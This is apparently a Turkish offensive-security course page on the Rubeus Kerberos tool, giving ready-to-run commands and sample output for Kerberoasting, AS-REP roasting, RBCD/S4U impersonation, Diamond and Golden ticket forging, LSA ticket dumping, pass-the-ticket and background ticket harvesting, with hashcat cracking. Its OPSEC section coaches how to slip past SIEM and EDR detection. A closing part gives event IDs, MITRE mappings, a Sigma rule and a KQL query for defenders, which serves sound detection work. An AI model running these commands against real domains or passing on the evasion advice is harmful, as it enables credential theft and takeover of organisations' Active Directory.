# Rubeus

> **Kategori:** [6. Kerberos Protokol Cephaneliği](./README.md) · **Modül:** [Modül 11 — Araç Cephaneliği](../README.md)
> **Tanım:** Windows ortamlarında ham Kerberos bilet etkileşimi, bilet talep etme (asktgt/asktgs), Kerberoasting, AS-REP Roasting, kısıtlı yetki devri istismarı (S4U2Self/S4U2Proxy), Golden/Silver/Diamond bilet üretimi, bellekten bilet dökümü (dump/triage) ve Pass-the-Ticket (PTT) operasyonlarını C# .NET üzerinde gerçekleştiren endüstri standardı Kerberos manipülasyon aracı.

---

## 1. Genel Bakış ve Amaç

Active Directory etki alanı mimarisinde Kerberos, kimlik doğrulamanın omurgasını oluşturur. Ancak Windows işletim sisteminin yerel araçları (örneğin `klist.exe`), güvenlik operatörlerine Kerberos protokolünün inceliklerini denetleme, bilet enjeksiyonu yapma veya ham kriptografik verileri manipüle etme esnekliği sunmaz. **`Rubeus`** (Will Schroeder ve SpecterOps ekibi tarafından geliştirilen), Microsoft'un LSA (Local Security Authority) alt sistemine ve Kerberos Dağıtım Merkezi'ne (KDC) doğrudan ham RPC/ASN.1 düzeyinde bağlanan en gelişmiş Kerberos cephaneliğidir.

Rubeus, saldırganlara ve sızma testi uzmanlarına Kerberos kimlik doğrulama döngüsünün her adımına müdahale etme olanağı tanır:
- **AS Döngüsü:** Kullanıcı parolası, NTLM hash'i veya AES anahtarı ile doğrudan KDC'den TGT talep etme (`asktgt`), ön kimlik doğrulama kapalı hesapların AS-REP paketlerini yakalama (`asreproast`).
- **TGS Döngüsü:** SPN taşıyan hesaplar için TGS biletleri talep ederek çevrimdışı parola kırma (`kerberoast`), kısıtlı yetki devrini kötüye kullanarak herhangi bir kullanıcı adına bilet üretme (`s4u`).
- **Bilet Sahteciliği (Forging):** KRBTGT anahtarıyla Golden Ticket, servis anahtarıyla Silver Ticket ve KDC imza kontrolünü aşan gerçek TGT manipülasyonu ile Diamond Ticket üretimi.
- **LSA Bellek Yönetimi:** Oturumlar arası biletleri tarama (`triage`), biletleri LSA belleğinden ayıklama (`dump`), hafızaya `.kirbi` bileti enjekte etme (`ptt`) ve arka planda yeni biletleri avlama (`harvest`).

### Mimari Akış Şeması

```
[ Saldırgan / Operatör (Rubeus) ]
       │
       ├── (1) AS-REQ / AS-REP (Port 88 - KDC) ─────────> [ asktgt / asreproast ]
       │     └── Parola, NTLM Hash, AES Anahtarı veya DONT_REQ_PREAUTH
       │
       ├── (2) TGS-REQ / TGS-REP (Port 88 - KDC) ───────> [ kerberoast / asktgs ]
       │     └── SPN Tabanlı Servis Biletleri (RC4 / AES256 Hashcat)
       │
       ├── (3) S4U2Self & S4U2Proxy Zinciri ─────────────> [ s4u (Kısıtlı Yetki Devri) ]
       │     └── Herhangi bir kullanıcı (Administrator) adına CIFS/LDAP bileti alma
       │
       ├── (4) PAC Manipülasyonu & Sahtecilik ───────────> [ golden / silver / diamond ]
       │     └── Yetki Grupları (Domain Admins / Enterprise Admins) Enjeksiyonu
       │
       ▼
[ Yerel LSA Belleği (Local Security Authority) ]
       ├── [ triage ]  ──> Mevcut oturumdaki biletleri listele (LUID)
       ├── [ dump ]    ──> LSA belleğindeki .kirbi biletlerini dışarı aktar
       └── [ ptt ]     ──> Sahte/çekilen bileti oturuma enjekte et (LsaCallAuthenticationPackage)
```

### Neden Önemli?

| Yetenek / Özellik | Açıklama | Operasyonel Değeri |
|---|---|---|
| **Eksiksiz KDC İletişimi** | Windows API'lerine bağımlı olmadan doğrudan KDC (Port 88) soket seviyesinde çalışır. | GUI ve yerel kısıtlamaları aşarak ham bilet trafiği üretir. |
| **Gelişmiş Kerberoasting** | AES-256/128 şifreleme desteği, otomatik SPN tespiti, LDAP filtreleme ve OPSEC bayrakları barındırır. | Modern savunmaları tetiklemeden servis hesabı parolalarını ele geçirme imkanı sunar. |
| **Diamond Ticket Desteği** | KDC'den meşru bir TGT talep edip sadece PAC alanını değiştirerek yeniden şifreler. | KDC Event ID 4768 denetimlerini ve bilet imzası anomali dedektörlerini tamamen atlatır. |
| **S4U Yetki Devri Zincirleme** | Hem geleneksel Kısıtlı Yetki Devrini (Constrained Delegation) hem de RBCD'yi tek komutta sömürür. | Makine hesabından etki alanı yöneticisi haklarına sıçramayı sağlar. |
| **In-Memory & C2 Uyumluluğu** | Cobalt Strike, Sliver veya Mythic üzerinden `execute-assembly` ile doğrudan bellekte çalışır. | Diske hiçbir `.kirbi` veya `.exe` dosyası bırakmadan operasyon yürütülür. |

### Karşılaştırma Tablosu

| Özellik / Araç | Rubeus | Mimikatz (sekurlsa::tickets) | Impacket (Linux Suite) | Keta (Go) |
|---|---|---|---|---|
| **Platform** | Windows (.NET / C#) | Windows (C / Win32) | Linux / Python | Çapraz Platform (Go) |
| **Çalışma Yeri** | Bellek İçi (In-Memory) | Bellek İçi / LSASS Hook | Ağ Üzerinden Uzaktan | CLI İkili |
| **LSASS Dokunma Şartı**| Sadece `dump` için şart | Evet (LSASS okuma şart) | Hayır (KDC ile konuşur) | Hayır |
| **Diamond Ticket** | Var (Dahili) | Yok | Manuel Python betiği | Yok |
| **S4U2Proxy Sömürüsü** | Var (`s4u`) | Kısmi | Var (`impacket-getST`) | Yok |
| **Kerberoasting** | Kapsamlı (AES/OPSEC) | Yok | Var (`GetUserSPNs`) | Temel |

---

## 2. Temel Sözdizimi ve Parametreler (CLI Flags)

```cmd
Rubeus.exe <KOMUT> [SEÇENEKLER]
```

### Ana Komutlar (Subcommands)

- **`asktgt`**: Kullanıcı kimlik bilgileriyle (parola, hash, aes, sertifika) KDC'den TGT talep eder.
- **`asktgs`**: Mevcut veya belirtilen bir TGT ile belirli bir SPN için TGS bileti talep eder.
- **`kerberoast`**: Etki alanındaki SPN'leri sorgular, TGS biletlerini çeker ve Hashcat/John formatında döker.
- **`asreproast`**: Kerberos ön kimlik doğrulaması gerektirmeyen hesapların AS-REP biletlerini toplar.
- **`s4u`**: S4U2self ve S4U2proxy protokol geçişlerini işleterek hedef servis için sahte bilet üretir.
- **`triage`**: Mevcut oturumdaki veya tüm oturumlardaki (yönetici ise) Kerberos biletlerini özetler.
- **`dump`**: LSA belleğindeki Kerberos biletlerini base64 encoded `.kirbi` olarak döker.
- **`ptt`**: Belirtilen base64 veya dosya halindeki `.kirbi` biletini LSA oturumuna enjekte eder.
- **`purge`**: Mevcut oturumdaki tüm Kerberos biletlerini bellekten temizler.
- **`describe`**: Bir Kerberos biletini ayrıştırarak şifreleme türü, bayraklar, süreler ve PAC içeriğini gösterir.
- **`golden`**: KRBTGT anahtarı ile sahte etki alanı yetkilendirme bileti (Golden TGT) üretir.
- **`silver`**: Servis hesabı anahtarı ile doğrudan belirli bir servis için TGS bileti üretir.
- **`diamond`**: Meşru bir TGT alıp PAC'ını manipüle ederek tespit edilemeyen TGT üretir.
- **`harvest`**: Bellekteki LSA bilet havuzunu belirli aralıklarla izleyerek yeni biletleri kaydeder.

### Kritik Parametre Tablosu

| Parametre | İlgili Komutlar | Açıklama | Örnek Değer |
|---|---|---|---|
| `/user:<ad>` | asktgt, kerberoast, s4u | Hedef veya kimliği taklit edilecek kullanıcı/makine adı. | `/user:Administrator` |
| `/password:<parola>`| asktgt | Kullanıcı düz metin parolası. | `/password:Admin2026!` |
| `/rc4:<hash>` | asktgt, golden, silver | Kullanıcının NTLM karma değeri (RC4 anahtarı). | `/rc4:01fc5a6be7...` |
| `/aes256:<anahtar>` | asktgt, golden, diamond| Kullanıcının AES-256 Kerberos anahtarı. | `/aes256:1673...` |
| `/domain:<ad>` | Genel | Hedef Active Directory etki alanı FQDN adı. | `/domain:corp.local` |
| `/dc:<ip/fqdn>` | Genel | Bağlanılacak Domain Controller IP adresi veya adı. | `/dc:192.168.1.10` |
| `/spn:<ad>` | asktgs, kerberoast, s4u | Hedef Service Principal Name. | `/spn:cifs/dc01.corp.local` |
| `/impersonateuser`| s4u | Kısıtlı yetki devrinde taklit edilecek hedef kullanıcı. | `/impersonateuser:Administrator`|
| `/msdsspn:<spn>` | s4u | S4U2proxy adımında erişilecek nihai hedef SPN. | `/msdsspn:cifs/target.corp.local`|
| `/ticket:<veri>` | asktgs, s4u, ptt | Base64 formatında `.kirbi` bilet verisi veya dosya yolu. | `/ticket:doIFqjCCBa...` |
| `/ptt` | asktgt, s4u, golden | Elde edilen bileti anında mevcut oturuma enjekte eder. | Bayrak |
| `/nowrap` | Genel | Konsol çıktılarında base64 biletlerin bölünmesini engeller. | Bayrak |
| `/opsec` | kerberoast | AES destekleyen hesaplar için RC4 bilet istemeyerek gürültüyü azaltır. | Bayrak |
| `/format:<ad>` | asreproast, kerberoast | Hash çıktısının formatı (`hashcat` veya `john`). | `/format:hashcat` |
| `/outfile:<dosya>` | kerberoast, asreproast | Yakalanan hash'lerin kaydedileceği disk dosyası. | `/outfile:hashes.txt` |
| `/luid:<id>` | ptt, dump, triage | Hedef oturum LUID tanıtıcısı (Oturum hedefleme). | `/luid:0x3e7` |

---

## 3. Pratik Komut Örnekleri

### Senaryo 1: OPSEC Uyumlu Kerberoasting ve Hashcat Formatında Hash Toplama

Etki alanındaki tüm SPN sahibi servis hesaplarının TGS biletleri çekilir. `/opsec` bayrağı sayesinde yalnızca desteklenen şifreleme türleri (AES veya RC4) filtrelenerek SIEM alarmları engellenir.

```cmd
Rubeus.exe kerberoast /format:hashcat /nowrap /opsec /outfile:C:\Users\Public\kerberoast.txt
```

**Rubeus Konsol Çıktısı Analizi:**

```text
   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/ 

  v2.2.0 

[*] Action: Kerberoasting
[*] Notice: /opsec specified, filtering out accounts with AES encryption enabled from RC4 requests!
[*] Searching path 'LDAP://dc01.corp.local/DC=corp,DC=local' for SPNs...
[*] Found 3 candidate accounts!

[*] SamAccountName         : svc_sql
[*] DistinguishedName      : CN=svc_sql,OU=ServiceAccounts,DC=corp,DC=local
[*] ServicePrincipalName   : MSSQLSvc/sql01.corp.local:1433
[*] Encryption Types       : AES128, AES256, RC4
[*] Using AES256 for Kerberoasting!
[*] Requesting TGS for 'MSSQLSvc/sql01.corp.local:1433' with etype AES256...
[+] Hash written to C:\Users\Public\kerberoast.txt:
$krb5tgs$18$svc_sql$corp.local$*MSSQLSvc/sql01.corp.local:1433*$A1B2C3...

[+] Kerberoasting completed! Hashes saved.
```

---

### Senaryo 2: Parolasız AS-REP Roasting (DONT_REQ_PREAUTH Keşfi)

Ön kimlik doğrulama zorunluluğu kaldırılmış kullanıcılar tespit edilir ve parola gerekmeksizin KDC'den dönen şifreli AS-REP paketleri toplanır.

```cmd
Rubeus.exe asreproast /format:hashcat /nowrap /outfile:C:\Users\Public\asrep.txt
```

**Hashcat İle Kırma Adımı:**

```bash
# Mod 18200: Kerberos 5 AS-REP etype 23 (RC4)
hashcat -m 18200 -a 0 asrep.txt /usr/share/wordlists/rockyou.txt -O
```

---

### Senaryo 3: S4U2Self ve S4U2Proxy Zinciri ile RBCD İstismarı

Ele geçirilen veya RBCD yetkisi tanımlanan bir makine hesabı (`EVILPC$`) kullanılarak, hedef makine (`WORKSTATION01$`) üzerinde `Administrator` adına CIFS/HOST hizmet bileti talep edilir ve mevcut oturuma enjekte edilir (`/ptt`).

```cmd
Rubeus.exe s4u /user:EVILPC$ /rc4:E1A96394AA6F5B407C3DF50F2D398865 /impersonateuser:Administrator /msdsspn:cifs/workstation01.corp.local /ptt
```

**Konsol Çıktısı Analizi:**

```text
[*] Action: S4U
[*] Using RC4 key for user EVILPC$
[*] Requesting TGT for EVILPC$...
[+] Got TGT! (EncryptionType: RC4)
[*] Performing S4U2Self for user 'Administrator' to SPN 'EVILPC$'...
[+] Got S4U2Self ticket for 'Administrator'!
[*] Performing S4U2Proxy for service 'cifs/workstation01.corp.local'...
[+] Got S4U2Proxy service ticket for 'Administrator'!
[*] Action: Import Ticket (PTT)
[+] Successfully imported ticket for user Administrator into current session (LUID: 0x3e7)!
```

```cmd
:: Bilet doğrulama ve hedef dosya sistemine erişim:
dir \\workstation01.corp.local\C$
```

---

### Senaryo 4: Diamond Ticket ile Tespit Edilemeyen TGT İnşa Etme

Klasik Golden Ticket oluşturulurken KDC ile hiçbir iletişim kurulmaz ve Event ID 4768 üretilmez. Bu durum modern EDR ve SIEM korelasyon kuralları tarafından anında tespit edilir. **Diamond Ticket**, KDC'den meşru bir standart TGT talep eder, KRBTGT anahtarıyla PAC'ı açıp `Domain Admins (512)` grubunu ekler, imzaları yeniler ve bileti tamamlar.

```cmd
Rubeus.exe diamond /user:lowpriv /password:Welcome123! /domain:corp.local /dc:dc01.corp.local /krbtgt:01fc5a6be7bc6929c40372d23f5052b3 /ticketuser:Administrator /groups:512,513,519 /ptt
```

---

### Senaryo 5: LSA Belleğindeki Biletleri Tarama (Triage) ve Dökme (Dump)

Yönetici (Elevated) bir komut satırında tüm oturumların Kerberos biletleri listelenir ve hedef kullanıcının bileti belleğe enjekte edilir.

```cmd
:: 1. Tüm oturumlardaki biletleri listeleyin
Rubeus.exe triage

:: 2. Belirli bir kullanıcının veya oturumun biletini çekin
Rubeus.exe dump /user:DA_Admin /nowrap

:: 3. Elde edilen Base64 .kirbi biletini mevcut oturuma enjekte edin
Rubeus.exe ptt /ticket:doIFqjCCBaagAwIBBaEDAgEWooIE...
```

---

### Senaryo 6: Harvest Modu ile Bellekteki Yeni Biletleri Arka Planda İzleme

Etki alanı yöneticilerinin oturum açmasını beklemek için arka planda 30 saniyede bir LSA belleğini tarayan ve yeni TGT/TGS biletlerini diske kaydeden monitör başlatılır.

```cmd
Rubeus.exe harvest /interval:30 /display /outfile:C:\Users\Public\harvested.txt
```

---

## 4. Karşılaşılan Hatalar ve Çözümleri (Troubleshooting)

| Hata Mesajı / Belirti | Kök Neden | Kesin Çözüm Adımı |
|---|---|---|
| `KDC_ERR_PREAUTH_FAILED (24)` | Belirtilen parola, NTLM hash veya AES anahtarı hatalı. | Kullanıcı parolasını veya hash'ini doğrulayın; hesap kilitlenmiş olabilir. |
| `KDC_ERR_C_PRINCIPAL_UNKNOWN (6)` | Belirtilen kullanıcı hesabı Active Directory veritabanında bulunamadı. | `/user` parametresinde `sAMAccountName` kullanıldığından ve etki alanı adının doğru yazıldığından emin olun. |
| `KDC_ERR_S_PRINCIPAL_UNKNOWN (7)` | İstenen SPN kayıtlı değil veya etki alanında mevcut değil. | `setspn -Q <SPN>` ile servisi doğrulayın veya FQDN adını tam girin (`cifs/target.corp.local`). |
| `KDC_ERR_ETYPE_NOSUPP (14)` | KDC talep edilen şifreleme türünü desteklemiyor (Örn: RC4 devre dışı bırakılmış). | `/enctype:aes256` bayrağını kullanın veya hash yerine AES anahtarı `/aes256:` parametresini girin. |
| `KRB_AP_ERR_SKEW (37)` | Kurban makine ile Domain Controller arasındaki sistem saati farkı 5 dakikadan fazla. | Yerel makinede sistem saatini DC ile senkronize edin (`w32tm /resync /force` veya `net time \\DC /set /y`). |
| `LsaCallAuthenticationPackage failed (0xc0000022 - Access Denied)` | Mevcut süreçte LSA oturumuna bilet enjekte etme (`ptt`) veya okuma yetkisi kısıtlı. | UAC kısıtlamasını aşın; komut satırını yönetici olarak başlatın veya SYSTEM token'ına geçin. |
| `S4U2Proxy failed: KDC_ERR_BADOPTION (13)` | Kurban makine hesabında `Trusted to Authenticate for Delegation` (Protocol Transition) yetkisi yok. | RBCD için makinenin `msDS-AllowedToActOnBehalfOfOtherIdentity` alanını kontrol edin veya geleneksel kısıtlı yetki devrinde TGT'yi kontrol edin. |

---

## 5. OPSEC ve Karşı Tespit (IOC)

```
        GÜRÜLTÜ SEVİYESİ: ORTA-YÜKSEK (KERBEROS EVENT ID'LERİ)
──────────────────────────────────────────────────────────────────
[ Windows Logları ] : Event ID 4768 (TGT), 4769 (TGS), 4770 (Renew), 4624
[ Kriptografik İz ] : Ticket Options (0x40810010), Encryption Type 0x17 (RC4)
[ EDR / AV ]        : LSA API çağrıları (LsaCallAuthenticationPackage), In-Memory PE
[ Sysmon ]          : Event ID 1 (Process Creation), Event ID 7 (Image Loaded)
```

### 5.1 Bırakılan İzler (Artifacts & Event Logs)

1. **Windows Security Event ID 4769 (Kerberos Service Ticket Operations):**
   - **Kerberoasting Tespiti:** Birkaç saniye içinde tek bir kullanıcı hesabından yüzlerce farklı SPN için TGS talebi gelmesi.
   - **Şifreleme Tipi Anomalisi:** Modern Windows ortamında `Ticket Encryption Type: 0x17` (RC4-HMAC) görülmesi olağan dışıdır. Meşru Windows istemcileri varsayılan olarak `0x12` (AES-256) talep eder.
2. **Windows Security Event ID 4768 (Kerberos TGT Request):**
   - **AS-REP Roasting Tespiti:** `Pre-Authentication Type: 0` (Pre-authentication not required) içeren olay kayıtları.
   - **Golden Ticket Anomalisi:** Event ID 4768 üretilmeden doğrudan Event ID 4769 üretiliyorsa Golden Ticket kullanımı kesindir.
3. **LSA Bellek Müdahalesi:**
   - `LsaRegisterLogonProcess` veya `LsaCallAuthenticationPackage` API çağrıları EDR bellek izleme sensörleri tarafından kaydedilir.

### 5.2 Ağ ve EDR İmzaları

- **ASN.1 Yapı Anomalileri:** Rubeus tarafından üretilen bazı ham bilet paketlerinde alan sıralamaları Windows yerel `kerberos.dll` kütüphanesinden ufak farklılıklar gösterebilir.
- **Yok Edilemeyen LUID Oturumu:** `ptt` yapıldığında enjekte edilen bilet LSA önbelleğinde görünür ancak oturum kapatıldığında temizlenir.

### 5.3 MITRE ATT&CK Eşleştirmesi

| Teknik ID | Teknik Adı | Araçtaki Karşılığı |
|---|---|---|
| **T1558.003** | Steal or Forge Kerberos Tickets: Kerberoasting | `kerberoast` komutu ile SPN servis biletlerini indirme. |
| **T1558.004** | Steal or Forge Kerberos Tickets: AS-REP Roasting | `asreproast` ile ön kimlik doğrulamasız bilet toplama. |
| **T1558.001** | Steal or Forge Kerberos Tickets: Golden Ticket | `golden` komutu ile sahte TGT üretimi. |
| **T1558.002** | Steal or Forge Kerberos Tickets: Silver Ticket | `silver` komutu ile servis bileti sahteciliği. |
| **T1550.002** | Use Alternate Authentication Material: Pass the Ticket | `ptt` komutu ile belleğe bilet enjeksiyonu. |

### 5.4 OPSEC Risk ve Önlem Tablosu

| Tespit Riski | Önlem ve Operasyonel Tavsiye |
|---|---|
| **RC4 Kerberoasting İmzası** | RC4 talepleri SIEM korelasyon kurallarını tetikler. Daima `/opsec` veya `/aes` bayraklarını kullanarak AES bilet talep edin. |
| **Tüm Etki Alanını Taramak** | `/kerberoast` komutunu parametresiz çalıştırmayın. BloodHound ile tespit ettiğiniz tekil yüksek değerli SPN'leri `/spn:` ile hedefleyin. |
| **Golden Ticket Tespiti** | Klasik Golden Ticket yerine daima meşru Event ID 4768 üreten `diamond` modunu kullanın. |
| **İkili (Binary) İmzası** | Rubeus kaynak kodunu doğrudan derlemeyin; sembolleri, stringleri gizleyin veya `In-Memory Loader` kullanın. |

### 5.5 Savunma Karşılığı (Blue Team / KQL & Sigma)

**Sigma Kuralı — Toplu Kerberoasting Aktivitesi Tespiti:**

```yaml
title: Potential Kerberoasting Attack via High Frequency TGS Requests
status: experimental
description: Detects an unusually high number of Kerberos TGS requests for different SPNs from a single source account.
logsource:
  product: windows
  service: security
detection:
  selection:
    EventID: 4769
    TicketEncryptionType: '0x17'
  timeframe: 1m
  condition: selection | count(ServiceName) by TargetUserName > 5
level: high
```

**Microsoft Sentinel (KQL) — Şüpheli RC4 Şifrelemeli TGS Talepleri:**

```kql
SecurityEvent
| where EventID == 4769
| where TicketEncryptionType == "0x17" // RC4-HMAC
| where ServiceName !endswith "$" and ServiceName !in ("krbtgt")
| summarize TicketCount = count(), SPNs = make_set(ServiceName) by TargetUserName, IpAddress, bin(TimeGenerated, 5m)
| where TicketCount > 3
| project TimeGenerated, TargetUserName, IpAddress, TicketCount, SPNs
```

---

## 6. En Çok Kullanılan Komutlar ve Açıklamaları (Cheat Sheet)

### Komut 1: OPSEC Uyumlu Kerberoasting (Hashcat Formatı)
```cmd
Rubeus.exe kerberoast /format:hashcat /nowrap /opsec /outfile:kerb.txt
```
- **Ne Yapar?** Yalnızca RC4 destekleyen hesaplardan RC4, diğerlerinden AES biletleri talep ederek SIEM alarmlarını tetiklemeden SPN biletlerini Hashcat formatında kaydeder.
- **Ne Zaman Kullanılır?** Etki alanındaki servis hesaplarının zayıf parolalarını çevrimdışı kırmak için ilk keşif adımında.
- **Parametreler:** `/format:hashcat`: Çıktı biçimi, `/opsec`: Güvenli filtreleme, `/outfile`: Çıktı dosyası.

### Komut 2: Parolasız Hesaplardan AS-REP Biletlerini Toplama
```cmd
Rubeus.exe asreproast /format:hashcat /nowrap /outfile:asrep.txt
```
- **Ne Yapar?** `DONT_REQ_PREAUTH` ayarlı tüm hesapları tespit eder ve parola bilmeksizin AS-REP hash'lerini indirir.
- **Ne Zaman Kullanılır?** Etki alanında kimlik bilgisi olmaksızın ilk parolayı ele geçirmek için.
- **Parametreler:** `/format:hashcat`: Hashcat 18200 formatı.

### Komut 3: NTLM Hash İle TGT Alma ve Oturuma Enjekte Etme (Pass-the-Hash to Kerberos)
```cmd
Rubeus.exe asktgt /user:Administrator /rc4:01fc5a6be7bc6929c40372d23f5052b3 /domain:corp.local /ptt
```
- **Ne Yapar?** Kullanıcının NTLM hash'ini kullanarak KDC'den resmi bir Kerberos TGT'si talep eder ve doğrudan yerel LSA oturumuna enjekte eder.
- **Ne Zaman Kullanılır?** NTLM kimlik doğrulamasının kapalı olduğu ancak Kerberos'un zorunlu olduğu ortamlarda Pass-the-Hash yapmak için.
- **Parametreler:** `/user`: Kullanıcı adı, `/rc4`: NTLM hash'i, `/ptt`: Bileti oturuma yükleme.

### Komut 4: S4U2Proxy ile RBCD Yetki Devri İstismarı
```cmd
Rubeus.exe s4u /user:EVILPC$ /rc4:E1A96394AA6F5B407C3DF50F2D398865 /impersonateuser:Administrator /msdsspn:cifs/dc01.corp.local /ptt
```
- **Ne Yapar?** Kontrol altındaki makine hesabı adına `Administrator` kullanıcısını taklit eden bir S4U bileti talep eder ve mevcut oturuma ekler.
- **Ne Zaman Kullanılır?** RBCD veya Kısıtlı Yetki Devri yapılandırılmış sunucuları ele geçirmek için.
- **Parametreler:** `/impersonateuser`: Taklit edilecek hesap, `/msdsspn`: Erişilecek nihai servis.

### Komut 5: Diamond Ticket Üretimi ve Enjeksiyonu
```cmd
Rubeus.exe diamond /user:lowpriv /password:Pass123! /krbtgt:01fc5a6be7... /ticketuser:Administrator /groups:512,519 /ptt
```
- **Ne Yapar?** KDC'den meşru TGT talep eder, KRBTGT hash'i ile PAC'ı açıp `Domain Admins` SID'sini ekler ve yeniden imzalayarak oturuma enjekte eder.
- **Ne Zaman Kullanılır?** Golden Ticket tespit kurallarını atlatmak ve Event ID 4768 denetimlerinden kaçmak için.
- **Parametreler:** `/krbtgt`: KRBTGT hash'i, `/groups`: Eklenecek ayrıcalıklı grup RID'leri.

### Komut 6: Mevcut Oturumdaki Biletleri Listeleme (Triage)
```cmd
Rubeus.exe triage
```
- **Ne Yapar?** Geçerli kullanıcının veya (yönetici ise) tüm oturumların LSA önbelleğindeki Kerberos biletlerini ve geçerlilik sürelerini özetler.
- **Ne Zaman Kullanılır?** Oturumda hangi biletlerin olduğunu denetlemek ve bilet hırsızlığı hedeflerini belirlemek için.
- **Parametreler:** Parametresiz çalışır.

### Komut 7: LSA Belleğinden Tüm Biletleri Çekme (Dump)
```cmd
Rubeus.exe dump /nowrap
```
- **Ne Yapar?** LSASS bellek alanından tüm kullanıcı oturumlarına ait TGT ve TGS biletlerini Base64 formatında ekrana döker.
- **Ne Zaman Kullanılır?** Yüksek yetkili hesapların (Domain Admin) biletlerini çalmak için yerel yönetici oturumunda.
- **Parametreler:** `/nowrap`: Base64 dizilerinin tek satırda kalmasını sağlar.

### Komut 8: Base64 Biletini Oturuma Enjekte Etme (Pass-the-Ticket)
```cmd
Rubeus.exe ptt /ticket:doIFqjCCBaagAwIBBaEDAgEWooIE...
```
- **Ne Yapar?** Base64 formatında verilen `.kirbi` biletini `LsaCallAuthenticationPackage` kullanarak mevcut oturuma yazar.
- **Ne Zaman Kullanılır?** Başka bir makineden çalınan veya sahte üretilen bileti kullanmak için.
- **Parametreler:** `/ticket`: Base64 bilet dizgisi.

### Komut 9: Bilet Ayrıntılarını ve PAC Yapısını İnceleme (Describe)
```cmd
Rubeus.exe describe /ticket:ticket.kirbi
```
- **Ne Yapar?** Belirtilen bilet dosyasını ayrıştırır; şifreleme algoritması, kullanıcı SID'si, grup üyelikleri ve yetki bayraklarını listeler.
- **Ne Zaman Kullanılır?** Çalınan bir biletin kimin adına olduğunu ve hangi grupları içerdiğini anlamak için.
- **Parametreler:** `/ticket`: Ayrıştırılacak dosya.

### Komut 10: Arka Planda Bilet Avlama (Harvest)
```cmd
Rubeus.exe harvest /interval:60 /outfile:C:\Users\Public\tickets.txt
```
- **Ne Yapar?** Her 60 saniyede bir LSA belleğini tarar, yeni oturum açan yöneticilerin biletlerini yakalar ve dosyaya kaydeder.
- **Ne Zaman Kullanılır?** Ele geçirilen bir sunucuda Domain Admin oturum açmasını beklerken (Credential Sniffing).
- **Parametreler:** `/interval`: Saniye cinsinden kontrol aralığı, `/outfile`: Kayıt dosyası.

---

## Kaynaklar

- **Resmi GitHub Reposu:** [GhostPack / Rubeus](https://github.com/GhostPack/Rubeus)
- **SpecterOps Araştırması:** [Why Does Kerberoasting Work?](https://posts.specterops.io/)
- **Semperis Araştırması:** [A Diamond (Ticket) in the Rough](https://www.semperis.com/blog/diamond-ticket-active-directory/)
- **Elad Shamir:** [Wagging the Dog: Abusing Resource-Based Constrained Delegation](https://posts.specterops.io/wagging-the-dog-abusing-resource-based-constrained-delegation-a313e68b35c0)

---

> **Önceki:** [← KrbRelayUp (Kategori 05)](../Kategori_05_NTLM_ve_Kerberos_Relay_Motorlari/KrbRelayUp.md) · **Sonraki:** [impacket-GetUserSPNs →](./impacket-GetUserSPNs.md)
